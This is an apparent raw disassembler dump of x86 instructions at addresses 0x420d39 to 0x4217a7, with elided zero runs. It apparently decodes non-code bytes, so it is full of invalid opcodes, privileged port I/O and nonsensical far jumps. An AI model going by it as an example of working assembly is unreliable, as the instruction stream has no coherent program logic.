  420d39:	out    dx,eax
  420d3a:	mov    ah,BYTE PTR [edx]
  420d3c:	push   0xffffff95
  420d3e:	jg     0x420cc4
  420d40:	jl     0x420d30
  420d42:	jle    0x420da6
  420d44:	pop    esi
  420d45:	mov    ds:0x661c2ba4,eax
  420d4a:	imul   esp,eax,0xd8fc2457
  420d50:	push   edx
  420d51:	and    edi,edi
  420d53:	add    BYTE PTR ds:0x6e31629b,dh
  420d59:	lock mov esi,0x9c4a784e
  420d5f:	popf   
  420d60:	mov    ds:0x11586133,eax
  420d65:	sbb    ch,ch
  420d67:	retf   0xeda
  420d6a:	lds    edx,FWORD PTR [edi-0x3a07023]
  420d70:	or     eax,0x27f865e
  420d75:	jmp    0x420d86
  420d77:	dec    ebp
  420d78:	test   BYTE PTR [edx+ebp*2],cl
  420d7b:	or     esp,DWORD PTR [ecx]
  420d7d:	mov    eax,ds:0x54b47c88
  420d82:	out    dx,eax
  420d83:	cwde   
  420d84:	popf   
  420d85:	popf   
  420d86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420d87:	and    bl,BYTE PTR fs:[esi+0xa]
  420d8b:	sbb    eax,0x460c13eb
  420d90:	push   edx
	...
  420df1:	add    BYTE PTR [eax],al
  420df3:	add    bh,ah
  420df5:	push   ds
  420df6:	into   
  420df7:	push   0x9fe7f8ff
  420dfc:	push   esi
  420dfd:	inc    edi
  420dfe:	lahf   
  420dff:	mov    al,ds:0x690f1151
  420e04:	mov    ds,WORD PTR [esi+0x1]
  420e07:	add    BYTE PTR ds:0xcb000001,al
  420e0d:	dec    ebx
  420e0e:	sbb    ebp,DWORD PTR [ebx+0x7551419c]
  420e14:	fdiv   QWORD PTR [ebx-0x374c4085]
  420e1a:	mov    esp,0x24d941c2
  420e1f:	dec    esp
  420e20:	mov    bh,0x3b
  420e22:	sti    
  420e23:	outs   dx,BYTE PTR ds:[esi]
  420e24:	gs xchg edi,ecx
  420e27:	inc    edi
  420e28:	test   eax,0x9576c788
  420e2d:	iret   
  420e2e:	std    
  420e2f:	les    eax,FWORD PTR ds:[ebp+0x650ee8ac]
  420e36:	pusha  
  420e37:	mov    eax,ds:0x1789f2ac
  420e3c:	pop    ecx
  420e3d:	fs dec edi
  420e3f:	aaa    
  420e40:	mov    ch,ah
  420e42:	push   edx
  420e43:	out    dx,al
  420e44:	ja     0x420e44
  420e46:	cmp    bl,BYTE PTR [ebp+0x46]
  420e49:	mov    ds:0xb72e7225,al
  420e4e:	test   DWORD PTR [edx+0x1b],ecx
  420e51:	clc    
  420e52:	sbb    al,0xf6
  420e54:	mov    ds:0x34f5a749,eax
  420e59:	imul   esi,DWORD PTR [ebx-0x4b],0xffffff98
  420e5d:	ror    BYTE PTR [edi],0xfd
  420e60:	pop    edi
  420e61:	mov    ?,WORD PTR [eax]
  420e63:	inc    eax
  420e64:	dec    ecx
  420e65:	punpckldq mm3,DWORD PTR [edi+0x31]
  420e69:	nop
  420e6a:	lods   al,BYTE PTR ds:[esi]
  420e6b:	inc    eax
  420e6c:	js     0x420ed4
  420e6e:	push   esi
  420e6f:	(bad)  
  420e71:	test   al,0x3c
  420e73:	arpl   WORD PTR [edi+0x48],dx
  420e76:	sbb    BYTE PTR [edi+0x5051f42d],dl
  420e7c:	mov    ah,0x39
  420e7e:	jg     0x420e25
  420e80:	addr16 call 0xd575:0xf27cc7d7
  420e88:	stc    
  420e89:	xchg   ebp,eax
  420e8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e8b:	jb     0x420e67
  420e8d:	lock mov esp,ebx
  420e90:	addr16 addr16 push cs
  420e93:	sbb    eax,edi
  420e95:	mov    DWORD PTR [esi+0x37edaaae],edi
  420e9b:	adc    esp,DWORD PTR [edi-0x721b1fb3]
  420ea1:	sub    ah,BYTE PTR [edx]
  420ea3:	in     al,0x40
  420ea5:	cmp    DWORD PTR [ecx+ebx*4],esi
  420ea8:	aad    0x4
  420eaa:	ret    0xf719
  420ead:	pop    ds
  420eae:	hlt    
  420eaf:	je     0x420e3f
  420eb1:	mov    ss,WORD PTR [ebp+0x6f67fd82]
  420eb7:	jne    0x420e81
  420eb9:	dec    edx
  420eba:	cld    
  420ebb:	imul   esi,DWORD PTR [ebx+0x682abb6b],0xffffffe8
  420ec2:	mov    ds:0xf75cddae,eax
  420ec7:	in     eax,dx
  420ec8:	xor    al,0x3b
  420eca:	sbb    eax,0x1fbe5a8b
  420ecf:	test   eax,0xae38c539
  420ed4:	sub    ecx,DWORD PTR [eax-0x5d2e43c9]
  420eda:	pop    ecx
  420edb:	push   cs
  420edc:	cli    
  420edd:	pop    ebp
  420ede:	cdq    
  420edf:	stc    
  420ee0:	(bad)  
  420ee1:	jl     0x420eee
  420ee3:	pop    esp
  420ee4:	sub    ebx,DWORD PTR [ebp+0x40]
  420ee7:	jle    0x420f3c
  420ee9:	xor    al,0x55
  420eeb:	mov    edx,gs
  420eed:	and    esi,edi
  420eef:	and    edi,ecx
  420ef1:	jmp    0x6682:0xeeab7daa
  420ef8:	xchg   ebp,eax
  420ef9:	mov    ch,0xc0
  420efb:	mov    ebx,0x90eb4d
  420f00:	pop    ebp
  420f01:	loope  0x420f2e
  420f03:	popa   
  420f04:	js     0x420f4d
  420f06:	mov    ecx,0x291834e1
  420f0b:	and    al,0x5f
  420f0d:	test   ecx,edx
  420f0f:	daa    
  420f10:	add    BYTE PTR es:[eax],al
	...
  420f73:	add    BYTE PTR [eax],ah
  420f75:	xchg   edi,eax
  420f76:	inc    edx
  420f77:	shl    edi,cl
  420f79:	xlat   BYTE PTR ds:[ebx]
  420f7a:	mov    cl,0xf7
  420f7c:	jg     0x420f6b
  420f7e:	or     esp,DWORD PTR [esi+0x6563e20c]
  420f84:	xchg   ebx,eax
  420f85:	pop    edi
  420f86:	add    DWORD PTR [eax],eax
  420f88:	add    eax,0xf3000001
  420f8d:	aam    0xe1
  420f8f:	xor    al,BYTE PTR [esi-0x22]
  420f92:	rol    DWORD PTR [ecx-0x36],cl
  420f95:	outs   dx,DWORD PTR ds:[esi]
  420f96:	shr    BYTE PTR [edi-0x6d7a05da],0xf1
  420f9d:	xchg   DWORD PTR [ebp+0xb],esi
  420fa0:	or     BYTE PTR [esi+0x184d1d73],0xa0
  420fa7:	out    dx,al
  420fa8:	test   BYTE PTR [ecx+0x3ebd0969],ah
  420fae:	cli    
  420faf:	mov    edx,0xea53cc2
  420fb4:	cwde   
  420fb5:	mov    ecx,0x134655a5
  420fba:	icebp  
  420fbb:	mov    dl,0xc2
  420fbd:	jno    0x420f83
  420fbf:	mov    edx,0xf6cf211c
  420fc4:	push   0x685a4b1d
  420fc9:	cmc    
  420fca:	rcl    BYTE PTR [ecx-0x5b9ce570],0x6c
  420fd1:	inc    ecx
  420fd2:	adc    eax,ecx
  420fd4:	inc    edi
  420fd5:	fst    DWORD PTR [ecx-0xfb8ed9f]
  420fdb:	or     al,0x90
  420fdd:	cs hlt 
  420fdf:	(bad)  
  420fe1:	js     0x420f6e
  420fe3:	mov    edi,0x9a9e29e3
  420fe8:	test   al,0x9f
  420fea:	stos   DWORD PTR es:[edi],eax
  420feb:	retf   
  420fec:	dec    ecx
  420fed:	adc    al,0xbd
  420fef:	push   ebx
  420ff0:	stc    
  420ff1:	icebp  
  420ff2:	or     eax,0x5a29abd5
  420ff7:	xor    al,0xbc
  420ff9:	rcr    dl,cl
  420ffb:	scas   al,BYTE PTR es:[edi]
  420ffc:	fidivr WORD PTR es:[ecx+0x36]
  421000:	xor    al,0x36
  421002:	xchg   ebp,eax
  421003:	cmp    eax,0x2b64874f
  421008:	add    DWORD PTR [edi+0x63],eax
  42100b:	mov    bl,0x42
  42100d:	add    eax,0x3055875c
  421012:	rol    DWORD PTR [esi],cl
  421014:	int    0x4a
  421016:	or     BYTE PTR [eax-0x5d],ch
  421019:	cmp    ah,BYTE PTR [edi]
  42101b:	sar    ebx,cl
  42101d:	push   ecx
  42101e:	mov    WORD PTR [ecx+ebx*1-0x3c],fs
  421022:	pop    esi
  421023:	xor    ch,BYTE PTR [edx-0x62185239]
  421029:	or     ebp,DWORD PTR [ecx]
  42102b:	pop    ecx
  42102c:	mov    esi,ebp
  42102e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42102f:	outs   dx,BYTE PTR ds:[esi]
  421030:	adc    BYTE PTR ds:[ebp+0x2e],bl
  421034:	outs   dx,BYTE PTR ds:[esi]
  421035:	xor    BYTE PTR [bp+di-0x3f],al
  421039:	push   ds
  42103a:	add    BYTE PTR ds:0xd11eab06,0x4
  421041:	std    
  421042:	in     eax,dx
  421043:	inc    ebp
  421044:	sub    DWORD PTR [esi+0x543d603b],edi
  42104a:	xor    eax,0x99e2eec7
  42104f:	mov    BYTE PTR [ecx],bl
  421051:	fstp   TBYTE PTR [edi]
  421053:	fild   QWORD PTR [edi-0x4c59cdef]
  421059:	pusha  
  42105a:	cmc    
  42105b:	xor    eax,0xe71e07d4
  421060:	addr16 push ds
  421062:	lock and BYTE PTR [edi-0x7c65fc77],dl
  421069:	cli    
  42106a:	pop    es
  42106b:	cmp    BYTE PTR [ebx],0xf8
  42106e:	outs   dx,BYTE PTR ds:[esi]
  42106f:	adc    dl,0xec
  421072:	push   ds
  421073:	jne    0x42100e
  421075:	xchg   BYTE PTR [esi],ah
  421077:	or     BYTE PTR [edi-0x5865d1ef],bl
  42107d:	mov    ds:0xc5a67dee,al
  421082:	add    edx,0x5a
  421085:	icebp  
  421086:	add    BYTE PTR [edx-0x7a],0x37
  42108a:	in     al,0x2c
  42108c:	cmp    esi,DWORD PTR [ebp+edi*4+0xf45c]
	...
  4210f3:	add    BYTE PTR [edi-0x243925a2],bl
  4210f9:	(bad)  
  4210fa:	lahf   
  4210fb:	pop    edi
  4210fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4210fd:	jne    0x4210e1
  4210ff:	mov    ss,eax
  421101:	int3   
  421102:	pusha  
  421103:	push   ss
  421104:	cwde   
  421105:	pusha  
  421106:	add    DWORD PTR [eax],eax
  421108:	add    eax,0x2b000001
  42110d:	cld    
  42110e:	jmp    0xeea8:0x6230c68e
  421115:	outs   dx,DWORD PTR ds:[esi]
  421116:	ins    DWORD PTR es:[edi],dx
  421117:	sti    
  421118:	ret    
  421119:	mov    edx,0xde1dd3c4
  42111e:	es pop edi
  421120:	mov    ebp,DWORD PTR fs:[eax]
  421123:	mov    ebp,0x7a30519b
  421128:	mov    al,ds:0xc529b598
  42112d:	jecxz  0x42119c
  42112f:	(bad)  
  421130:	mov    edx,0xf498c627
  421135:	inc    eax
  421136:	dec    esi
  421137:	dec    ebp
  421138:	xchg   ebx,eax
  421139:	adc    BYTE PTR [edi],ah
  42113b:	mov    eax,ds:0x9f40a034
  421140:	pop    eax
  421141:	sub    BYTE PTR [eax+0x24],ah
  421144:	add    BYTE PTR [edx+0x776d03bf],bl
  42114a:	or     eax,0xfe98531b
  42114f:	sbb    DWORD PTR [ecx],esp
  421151:	or     edx,DWORD PTR [edi+0x3f]
  421154:	in     al,0x73
  421156:	xor    BYTE PTR [ecx+0x3d],ch
  421159:	dec    edi
  42115a:	xchg   bh,ah
  42115c:	in     eax,dx
  42115d:	ja     0x4210f7
  42115f:	fsub   DWORD PTR [edi+0x787d6400]
  421165:	push   esp
  421166:	gs leave 
  421168:	imul   BYTE PTR [ebx]
  42116a:	or     ah,BYTE PTR [edx+0x2438c677]
  421170:	repnz leave 
  421172:	stos   BYTE PTR es:[edi],al
  421173:	or     al,0x3c
  421175:	and    BYTE PTR [ebx+0x1d],bh
  421178:	gs popa 
  42117a:	repnz scas al,BYTE PTR es:[edi]
  42117c:	shl    BYTE PTR [esi+edx*8+0x98b839d],0x10
  421184:	loope  0x421130
  421186:	mov    eax,ds:0xcab3542a
  42118b:	les    esp,FWORD PTR [ebp-0x659c24af]
  421191:	add    BYTE PTR [edi-0x5c3b32],0x22
  421198:	mov    bh,0x8
  42119a:	or     bl,BYTE PTR [edi]
  42119c:	sbb    eax,edi
  42119e:	xlat   BYTE PTR ds:[ebx]
  42119f:	cmp    al,0xc3
  4211a1:	bound  ecx,QWORD PTR [ecx-0x76]
  4211a4:	test   eax,0x9531fee5
  4211a9:	jb     0x4211d8
  4211ab:	(bad)  
  4211ac:	lahf   
  4211ad:	mov    ds:0xe4d9bded,eax
  4211b2:	rcr    BYTE PTR [ecx],cl
  4211b4:	sub    eax,0x7eafb1b4
  4211b9:	push   es
  4211ba:	cmp    al,BYTE PTR [ebx]
  4211bc:	lea    edx,ds:0x1383a6bb
  4211c2:	stos   DWORD PTR es:[edi],eax
  4211c3:	pusha  
  4211c4:	call   esi
  4211c6:	aaa    
  4211c7:	pop    ebp
  4211c8:	into   
  4211c9:	push   0x2e
  4211cb:	mov    dh,BYTE PTR [ebp+0x6d76502c]
  4211d1:	xor    dh,BYTE PTR [eax+0x282fe4e0]
  4211d7:	(bad)  
  4211d8:	out    dx,al
  4211d9:	lods   al,BYTE PTR ds:[esi]
  4211da:	sbb    al,0x26
  4211dc:	int3   
  4211dd:	(bad)  
  4211de:	mov    esi,0x9ace0736
  4211e3:	hlt    
  4211e4:	test   dl,cl
  4211e6:	popa   
  4211e7:	retf   
  4211e8:	in     al,0xa9
  4211ea:	(bad)  
  4211eb:	ja     0x421183
  4211ed:	sub    ch,dl
  4211ef:	push   es
  4211f0:	mov    ds:0xc1a80b84,eax
  4211f5:	sar    DWORD PTR [ebx+0x3d85cb97],1
  4211fb:	repnz sti 
  4211fd:	xchg   DWORD PTR [ecx+0x46],edi
  421200:	leave  
  421201:	adc    bh,ah
  421203:	inc    edx
  421204:	ins    BYTE PTR es:[edi],dx
  421205:	xchg   edi,eax
  421206:	loop   0x421249
  421208:	(bad)  
  421209:	mov    eax,0xd6a28444
  42120e:	push   cs
  42120f:	add    BYTE PTR [ebx],cl
	...
  421271:	add    BYTE PTR [eax],al
  421273:	add    BYTE PTR [esi-0x700870e1],bl
  421279:	idiv   esi
  42127b:	jg     0x42123a
  42127d:	sub    eax,0xe2d07ab3
  421282:	mov    bl,0x56
  421284:	popf   
  421285:	popa   
  421286:	add    DWORD PTR [eax],eax
  421288:	add    eax,0xc3000001
  42128d:	mov    eax,0x3e7e1887
  421292:	push   ecx
  421293:	add    eax,0x9b4390d3
  421298:	nop
  421299:	adc    BYTE PTR [esi+0x2fd7270d],bl
  42129f:	cwde   
  4212a0:	outs   dx,BYTE PTR ds:[esi]
  4212a1:	dec    edi
  4212a2:	inc    ebx
  4212a3:	xchg   esp,eax
  4212a4:	das    
  4212a5:	push   es
  4212a6:	push   edx
  4212a7:	sbb    BYTE PTR [ecx-0x1],bl
  4212aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4212ab:	inc    esp
  4212ac:	mov    dl,0x24
  4212ae:	mov    al,0xc8
  4212b0:	sbb    DWORD PTR [ebx],0xfecd85c9
  4212b6:	pop    ecx
  4212b7:	sub    al,0x3a
  4212b9:	jle    0x421305
  4212bb:	aad    0x34
  4212bd:	pop    ebp
  4212be:	jp     0x421310
  4212c0:	inc    eax
  4212c1:	(bad)  
  4212c4:	ds xchg edx,eax
  4212c6:	pop    es
  4212c7:	shl    DWORD PTR gs:[ecx+0x5a],0xc2
  4212cc:	add    al,bl
  4212ce:	das    
  4212cf:	je     0x4212db
  4212d1:	pop    edx
  4212d2:	sar    BYTE PTR [eax-0x7a60cbe0],1
  4212d8:	cmp    bl,BYTE PTR [edi]
  4212da:	mov    ds:0x31909ec9,eax
  4212df:	cmp    BYTE PTR [esi-0x3c0b149],dh
  4212e5:	pop    esi
  4212e6:	cs sub eax,0x4537b36
  4212ec:	inc    ecx
  4212ed:	clc    
  4212ee:	arpl   WORD PTR [ebx+ebp*4+0x30],si
  4212f2:	mov    al,BYTE PTR [edi]
  4212f4:	test   DWORD PTR [edx-0x53],edx
  4212f7:	xor    BYTE PTR [ebx+0x56],0x7b
  4212fb:	jnp    0xa6daa704
  421301:	xchg   ebx,eax
  421302:	gs fsubrp st(3),st
  421305:	fimul  WORD PTR [edx]
  421307:	push   edi
  421308:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421309:	dec    esp
  42130a:	stc    
  42130b:	mov    WORD PTR [ebx+ebx*2-0x76],ss
  42130f:	inc    eax
  421310:	inc    edx
  421311:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421312:	or     ecx,esp
  421314:	pop    edi
  421315:	rcr    DWORD PTR [esi+esi*8-0x28],1
  421319:	mov    es,WORD PTR [edx-0x21faca65]
  42131f:	je     0x421375
  421321:	push   es
  421322:	pop    ss
  421323:	mov    dh,dl
  421325:	retf   
  421326:	mov    ch,0x5a
  421328:	inc    ebp
  421329:	mov    edi,0x6ae80ff3
  42132e:	lods   al,BYTE PTR ds:[esi]
  42132f:	jl     0x42130c
  421331:	jno    0x4212d8
  421333:	lods   al,BYTE PTR ds:[esi]
  421334:	out    dx,eax
  421335:	rcl    BYTE PTR [ecx+0x587d9f78],1
  42133b:	xor    al,0x42
  42133d:	mov    bh,0xbd
  42133f:	mov    eax,DWORD PTR [ebp+0x7bdea571]
  421345:	mov    dl,BYTE PTR [ebx-0x7d6956d]
  42134b:	pop    edx
  42134c:	or     DWORD PTR [edi+0xb],edx
  42134f:	mov    esi,0xa8dead1f
  421354:	in     eax,dx
  421355:	lock add DWORD PTR [ebx],0xaaeff42c
  42135c:	adc    eax,ecx
  42135e:	outs   dx,BYTE PTR ds:[esi]
  42135f:	cli    
  421360:	test   eax,0x6749737f
  421365:	in     eax,dx
  421366:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421367:	call   0x47a9a882
  42136c:	repz pushf 
  42136e:	adc    ah,bh
  421370:	inc    edx
  421371:	fisttp DWORD PTR [ecx+edx*1+0x6b186d37]
  421378:	mov    ecx,0xe6503a91
  42137d:	gs (bad) 
  42137f:	aad    0xd6
  421381:	mov    ebp,0x64bfdc0
  421386:	retf   
  421387:	xchg   esp,eax
  421388:	inc    eax
  421389:	bt     DWORD PTR [ecx+edi*2-0x75],0x9d
  42138f:	push   edx
  421390:	mov    al,0x0
	...
  4213f2:	add    BYTE PTR [eax],al
  4213f4:	inc    bh
  4213f6:	pop    esp
  4213f7:	mov    eax,ds:0xdfffbb7d
  4213fc:	fstp   DWORD PTR [ebp+0x22fdf49f]
  421402:	sub    DWORD PTR [edi],ebp
  421404:	mov    ds:0x5000162,al
  421409:	add    DWORD PTR [eax],eax
  42140b:	add    BYTE PTR [edi],bl
  42140d:	jno    0x7a6a5bc5
  421413:	out    dx,eax
  421414:	lods   eax,DWORD PTR ds:[esi]
  421415:	or     eax,0x3106f08a
  42141a:	add    eax,ecx
  42141c:	test   al,0xba
  42141e:	ret    
  42141f:	dec    edx
  421420:	ss ds dec edi
  421423:	dec    ebp
  421424:	mov    bl,0x3a
  421426:	inc    edi
  421427:	fild   DWORD PTR [ebx]
  421429:	xchg   BYTE PTR [ecx],ch
  42142b:	jo     0x4213c2
  42142d:	ficomp WORD PTR [ecx-0x23c95440]
  421433:	add    eax,0x1e6bfb84
  421438:	sub    esi,ecx
  42143a:	leave  
  42143b:	shl    BYTE PTR [edi],cl
  42143d:	arpl   WORD PTR [edx-0x5b],cx
  421440:	cmp    BYTE PTR [edx+ebx*4-0xb],dh
  421444:	or     esi,esp
  421446:	add    eax,0x2b1dbc68
  42144b:	sbb    ebx,ecx
  42144d:	repz clc 
  42144f:	mov    ebp,0xd99d6b1b
  421454:	stos   DWORD PTR es:[edi],eax
  421455:	mov    esp,DWORD PTR [eax+esi*4]
  421458:	sbb    BYTE PTR [edx],0xc1
  42145b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42145c:	call   FWORD PTR [edx+ebx*1]
  42145f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421460:	and    BYTE PTR [edx],bh
  421462:	imul   eax,DWORD PTR [ecx],0x24
  421465:	sub    BYTE PTR [eax-0x117d1d45],0x12
  42146c:	int3   
  42146d:	je     0x4214a7
  42146f:	adc    eax,0x9ae407e3
  421474:	enter  0xdeff,0x5d
  421478:	or     al,0xe9
  42147a:	pop    ds
  42147b:	pop    eax
  42147c:	iret   
  42147d:	fisttp WORD PTR [esi+0x26]
  421480:	mov    esi,DWORD PTR [esi]
  421482:	call   0xd234:0x12bfd14b
  421489:	add    DWORD PTR [ecx],eax
  42148b:	enter  0x1d56,0xc0
  42148f:	adc    edx,DWORD PTR [ebx+eax*2]
  421492:	sub    cl,ch
  421494:	iret   
  421495:	or     DWORD PTR [edi-0x1a],edi
  421498:	(bad)  
  421499:	dec    ebx
  42149a:	pop    ecx
  42149b:	and    DWORD PTR [edi+0x27c1ccdb],ecx
  4214a1:	push   ds
  4214a2:	adc    DWORD PTR [ebx+ecx*8-0x3c],esi
  4214a6:	clc    
  4214a7:	jne    0x421435
  4214a9:	pop    esp
  4214aa:	es ins DWORD PTR es:[edi],dx
  4214ac:	jb     0x421475
  4214ae:	and    DWORD PTR [esi+0x22ef75b1],esi
  4214b4:	in     al,0x1b
  4214b6:	mov    es,WORD PTR [esi]
  4214b8:	lods   eax,DWORD PTR ds:[esi]
  4214b9:	sbb    BYTE PTR [ebx+ecx*4-0x3685bd86],cl
  4214c0:	out    0xf7,al
  4214c2:	adc    BYTE PTR [edi],0xc2
  4214c5:	xor    dh,0x8a
  4214c8:	inc    edx
  4214c9:	push   ebp
  4214ca:	mov    esi,DWORD PTR [esi]
  4214cc:	lods   al,BYTE PTR ds:[esi]
  4214cd:	es pop ecx
  4214cf:	xchg   esp,eax
  4214d0:	jmp    0x3701cf4
  4214d5:	fcmove st,st(3)
  4214d7:	inc    esi
  4214d8:	out    0x70,eax
  4214da:	cmp    cl,0x69
  4214dd:	es or  eax,0x55f6a853
  4214e3:	cwde   
  4214e4:	pop    es
  4214e5:	retf   
  4214e6:	dec    ebp
  4214e7:	xor    al,0x21
  4214e9:	pop    edx
  4214ea:	je     0x4214b7
  4214ec:	push   eax
  4214ed:	iret   
  4214ee:	cld    
  4214ef:	neg    esp
  4214f1:	xchg   DWORD PTR [edx],ebp
  4214f3:	aas    
  4214f4:	leave  
  4214f5:	sti    
  4214f6:	pop    esi
  4214f7:	and    bh,BYTE PTR [edi+0x58]
  4214fa:	pop    esi
  4214fb:	mov    fs,edx
  4214fd:	iret   
  4214fe:	adc    BYTE PTR [edi+0x3c],bl
  421501:	in     eax,dx
  421502:	rol    BYTE PTR [eax+edx*8+0x27d990fe],cl
  421509:	enter  0xf3fd,0x5b
  42150d:	icebp  
  42150e:	jmp    0x0:0x9f48
	...
  421571:	add    BYTE PTR [eax],al
  421573:	add    dh,dl
  421575:	repnz test BYTE PTR [eax],bl
  421578:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421579:	jle    0x421559
  42157b:	(bad)  
  42157c:	arpl   WORD PTR [eax-0x6098bd4c],bp
  421582:	inc    ebp
  421583:	inc    edi
  421584:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421585:	arpl   WORD PTR [ecx],ax
  421587:	add    BYTE PTR ds:0x1c000001,al
  42158d:	in     al,0x7
  42158f:	mov    dh,0xc9
  421591:	pop    edx
  421592:	inc    edi
  421593:	leave  
  421594:	(bad)  
  421595:	sub    DWORD PTR [esi-0x318d702c],esp
  42159b:	mov    dh,0x8a
  42159d:	les    ebx,FWORD PTR [ecx+0x14]
  4215a0:	dec    esp
  4215a1:	sub    al,bh
  4215a3:	jne    0x4215cf
  4215a5:	push   ebx
  4215a6:	fwait
  4215a7:	cli    
  4215a8:	adc    al,BYTE PTR [esi-0x5829abbb]
  4215ae:	test   eax,0x5332f629
  4215b3:	(bad)  
  4215b4:	adc    BYTE PTR [ebp+ebp*1-0x75],bl
  4215b8:	inc    ebx
  4215b9:	(bad)  
  4215ba:	std    
  4215bb:	sbb    esp,edi
  4215bd:	xor    ecx,DWORD PTR [ebx]
  4215bf:	push   ebp
  4215c0:	add    ebx,DWORD PTR [edi+esi*1]
  4215c3:	mov    DWORD PTR [eax],edi
  4215c5:	dec    esi
  4215c6:	repz add DWORD PTR [edx],ecx
  4215c9:	sub    ebp,DWORD PTR [eax]
  4215cb:	ret    0x2050
  4215ce:	repz add eax,0xe4edef7e
  4215d4:	dec    ebx
  4215d5:	dec    edx
  4215d6:	pop    eax
  4215d7:	jp     0x4215db
  4215d9:	je     0x4215ed
  4215db:	pop    esp
  4215dc:	lods   eax,DWORD PTR ds:[esi]
  4215dd:	push   edi
  4215de:	xchg   ebp,eax
  4215df:	xchg   edi,esi
  4215e1:	mov    ecx,0x245a743f
  4215e6:	stos   DWORD PTR es:[edi],eax
  4215e7:	inc    edx
  4215e8:	pop    eax
  4215e9:	hlt    
  4215ea:	out    0x87,eax
  4215ec:	mov    ebp,0x5ef8b67
  4215f1:	shr    BYTE PTR ds:0x65166fde,1
  4215f7:	popa   
  4215f8:	push   es
  4215f9:	shl    BYTE PTR [edi+0x47],cl
  4215fc:	jl     0x421638
  4215fe:	mov    dl,0x81
  421600:	jmp    0xe5aa7f8d
  421605:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421606:	mov    edx,0xfc13f8a9
  42160b:	mov    ?,ebp
  42160d:	jmp    0xf2:0xe658106
  421614:	jne    0x42160b
  421616:	mov    eax,0x9e11e07d
  42161b:	dec    esp
  42161c:	mov    dh,BYTE PTR ds:0xd50c56c
  421622:	outs   dx,BYTE PTR ds:[esi]
  421623:	sub    dh,dl
  421625:	aam    0x28
  421627:	mov    ebx,edi
  421629:	xor    DWORD PTR [ebp-0x35b4ab41],edx
  42162f:	push   0xffffffff
  421631:	imul   ecx,DWORD PTR [edi],0x3201a90e
  421637:	xchg   DWORD PTR [ebx-0x1d],esi
  42163a:	mov    edx,0x62d7293c
  42163f:	sahf   
  421640:	ds jle 0x42161e
  421643:	dec    edx
  421644:	inc    edi
  421645:	mov    al,0xf8
  421647:	mov    ebx,0x95f3b872
  42164c:	jae    0x421656
  42164e:	clc    
  42164f:	lods   eax,DWORD PTR ds:[esi]
  421650:	fadd   QWORD PTR [edx]
  421652:	scas   eax,DWORD PTR es:[edi]
  421653:	retf   0xc371
  421656:	xor    DWORD PTR [ebx],esp
  421658:	cs enter 0xea3c,0x38
  42165d:	jne    0x421694
  42165f:	sub    eax,0x59917122
  421664:	and    DWORD PTR [eax-0x6df1f28b],0xe4cfbe1f
  42166e:	push   ebx
  42166f:	mov    DWORD PTR [edi],ecx
  421671:	add    eax,0xf84e415d
  421676:	int    0xc9
  421678:	pop    ss
  421679:	ins    BYTE PTR es:[edi],dx
  42167a:	pop    ss
  42167b:	and    eax,edx
  42167d:	push   ecx
  42167e:	aaa    
  42167f:	mov    esp,0x17fcdf88
  421684:	cld    
  421685:	pop    ds
  421686:	jl     0x421699
  421688:	or     BYTE PTR [edx],cl
  42168a:	or     ebp,DWORD PTR [ebx+0x2d]
  42168d:	mov    ebx,0x2afe18
	...
  4216f2:	add    BYTE PTR [eax],al
  4216f4:	stos   DWORD PTR es:[edi],eax
  4216f5:	sub    al,0xed
  4216f7:	stos   BYTE PTR es:[edi],al
  4216f8:	out    dx,eax
  4216f9:	jmp    0x4216ea
  4216fb:	sub    eax,0xa3418669
  421700:	jecxz  0x4216c4
  421702:	dec    ebx
  421703:	sub    DWORD PTR [esp+eiz*2+0x1050001],0x310a0000
  42170e:	(bad)  
  42170f:	daa    
  421710:	jmp    0xcf84a1ab
  421715:	jns    0x421732
  421717:	das    
  421718:	leave  
  421719:	sahf   
  42171a:	inc    ebp
  42171b:	loope  0x4216b0
  42171d:	sahf   
  42171e:	out    dx,eax
  42171f:	pop    esp
  421720:	pop    ebp
  421721:	sahf   
  421722:	inc    ebx
  421723:	outs   dx,DWORD PTR ds:[esi]
  421724:	sub    eax,0xa307261f
  421729:	repz xchg ebp,eax
  42172b:	das    
  42172c:	xchg   ecx,eax
  42172d:	jbe    0x4216f7
  42172f:	pop    ebx
  421730:	in     eax,0xba
  421732:	xor    ah,BYTE PTR [ebx]
  421734:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421735:	push   0xfda381fe
  42173a:	jge    0x42176e
  42173c:	jmp    0xbddc2087
  421741:	ins    BYTE PTR es:[edi],dx
  421742:	sbb    ebx,DWORD PTR [eax-0x1ff6b4d9]
  421748:	mov    esi,0x86e09b3f
  42174d:	jo     0x4216d0
  42174f:	test   DWORD PTR [edi*1-0x70e48032],ecx
  421756:	push   edi
  421757:	sbb    DWORD PTR [esi],eax
  421759:	mov    ebp,0xd0a23efa
  42175e:	outs   dx,BYTE PTR ds:[esi]
  42175f:	in     al,0xff
  421761:	cld    
  421762:	inc    ecx
  421763:	rcl    DWORD PTR [ecx],1
  421765:	cld    
  421766:	retf   
  421767:	pop    edx
  421768:	jle    0x421769
  42176a:	jl     0x421731
  42176c:	rcr    DWORD PTR [ebx+ebx*4],1
  42176f:	add    BYTE PTR [ebx-0x1f],cl
  421772:	cli    
  421773:	bound  edx,QWORD PTR [eax+ecx*1-0x1431a33a]
  42177a:	test   eax,0xd6fbf11f
  42177f:	fst    QWORD PTR [ebp-0x4ed626b4]
  421785:	add    BYTE PTR [esi],dl
  421787:	xchg   ebx,eax
  421788:	cmp    DWORD PTR [edi+0x7f1d023f],edx
  42178e:	nop
  42178f:	and    BYTE PTR [eax-0x5581abaf],bh
  421795:	sar    DWORD PTR es:[eax+0x560974b8],0x9b
  42179d:	xor    dl,BYTE PTR [ebx-0x47]
  4217a0:	cld    
  4217a1:	jl     0x42174d
  4217a3:	xchg   edx,eax
  4217a4:	xchg   esp,eax
  4217a5:	xchg   esp,eax
  4217a6:	dec    edx
  4217a7:	aam    0xe
